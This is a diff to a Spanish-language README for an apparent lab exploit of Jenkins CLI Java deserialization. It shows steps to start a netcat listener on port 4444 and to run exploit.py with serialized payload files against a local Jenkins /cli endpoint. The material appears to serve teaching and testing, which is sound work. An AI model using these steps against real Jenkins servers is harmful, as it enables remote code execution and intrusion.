@@ -40,19 +40,19 @@
 
 3. Ingresar a ```localhost:8080/cli o 127.0.0.1:8080/cli``` para asegurarse que inició correctamente (Solo ingresar la clave que pide al iniciar, no es necesario configurar plugins)
 
-4. Iniciar una sesión de Ncat para escuchar en el puerto 4444 (o el que deseen):
+4. Iniciar una sesión de Ncat para escuchar en el puerto 4444:
 
-  ``` Windows: ncat -v -l -p 4444```
+    ``` Windows: ncat -v -l -p 4444```
 
-  ``` OSX/Linux: netcat -v -l -p 4444```
+    ``` OSX/Linux: netcat -v -l -p 4444```
 
 ## Ejecución del exploit y explicación
 
 Para ejecutar el exploit basta con el siguiente comando:
 
-  ```Windows: python exploit.py http://127.0.0.1:8080/cli java_serialization_data_win.bin```
+    ```Windows: python exploit.py http://127.0.0.1:8080/cli java_serialization_data_win.bin```
 
-  ```OSX/Linux: python exploit.py http://127.0.0.1:8080/cli java_serialization_data_mac_linux.bin```
+    ```OSX/Linux: python exploit.py http://127.0.0.1:8080/cli java_serialization_data_mac_linux.bin```
 
 Este script de Python inicia una sesión con el CLI de Jenkins realizando un POST al CLI en modo "download":
 ```
